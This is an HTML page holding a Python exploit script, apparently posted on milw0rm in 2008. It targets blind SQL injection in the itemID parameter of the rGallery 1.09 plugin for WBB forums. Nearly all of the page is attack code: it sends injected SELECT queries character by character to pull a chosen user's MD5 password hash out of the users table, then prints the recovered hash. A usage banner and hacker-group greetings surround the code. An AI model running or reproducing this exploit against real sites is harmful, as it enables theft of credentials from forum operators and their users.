<html><head><title>WBB Plugin rGallery 1.09 (itemID) Blind SQL Injection Exploit</title></head><pre>import sys, urllib2, re

print &quot;\n &quot;
print &quot;                          \\#'#/                        &quot;
print &quot;                          (-.-)                         &quot;
print &quot;  -------------------oOO---(_)---OOo--------------------&quot;
print &quot;  |   rGallery 1.09 (+-) Exploit by Five-Three-Nine    |&quot;
print &quot;  |  Using Blind SQL Injection in 'itemID' of rGallery |&quot;
print &quot;  |                                                    |&quot;
print &quot;  |                Greets and Shouts to:               |&quot;
print &quot;  | tmh, n00bor, activebeta, Ghost, Saufkumpel, Altair |&quot;  
print &quot;  | crusader727, Nemo, Loader007, J0hn.X3r, sNiper109  |&quot;                                      
print &quot;  ------------------------------------------------------\n&quot;


if len(sys.argv) != 5:
	print &quot;\nUsage: ./rGallery.py &lt;UserID&gt; &lt;UserTable&gt; &lt;ImageID&gt; &lt;site&gt;&quot;
	print &quot;Ex: ./rGallery.py 1 bb1_users 19 http://example.com\n&quot;
	sys.exit(1)

UserID = sys.argv[1]
Prefix = sys.argv[2]
ImageID = sys.argv[3]
Host = sys.argv[4]

Res = [48,49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102]
MD5 = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32]
Hash = &quot;&quot;

UserID = int(UserID)
UserID -= 1
UserID = str(UserID)

for MD5Count in range(32):
	for ResCount in range(16):
		try:
			source = urllib2.urlopen(Host +&quot;/index.php?page=RGalleryImageWrapper&amp;itemID=&quot; + ImageID +&quot;%20and%20ascii(substring((SELECT%20password%20from%20&quot; + Prefix +&quot;%20limit%20&quot;+ UserID + &quot;,1),&quot; + str(MD5Count + 1) + &quot;,1))=&quot;+ str(Res[ResCount])).read()
			
			print &quot;[+] Character &quot; + str(MD5Count + 1) +  &quot; found! &quot; + str(Res[ResCount])
			MD5[MD5Count] = Res[ResCount]
			break
		except(urllib2.URLError):
			continue 
		except(urllib2.HTTPError):
			print &quot;[+] Error: Can't load the Site&quot;
			sys.exit(1)


for i in MD5:
	Hash = Hash + str(chr(i))
	
print &quot;\n[+] Hash: &quot; + Hash

# milw0rm.com [2008-10-20]</pre></html>